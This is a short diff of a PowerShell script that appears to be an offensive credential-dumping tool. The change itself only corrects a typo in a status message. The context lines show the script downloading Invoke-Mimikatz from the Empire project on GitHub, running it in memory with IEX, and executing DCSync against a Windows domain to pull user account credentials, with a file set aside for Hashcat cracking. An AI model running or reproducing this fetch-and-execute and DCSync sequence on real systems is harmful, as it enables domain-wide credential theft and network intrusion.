@@ -13,7 +13,7 @@ $HASHCATFILE = $PATH +"Hashcat.txt"
 Write-Host "[-] Downloading Mimikatz into Memory" -ForegroundColor Cyan
 IEX(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
-Write-Host "[-] DCSync will be executed again the Domain: $Domain" -ForegroundColor Cyan
+Write-Host "[-] DCSync will be executed against the Domain: $Domain" -ForegroundColor Cyan
 Write-Host "[-] Only User accounts will be extracted" -ForegroundColor Cyan
 
 Write-Host "[!] Executing Mimikatz" -ForegroundColor Yellow
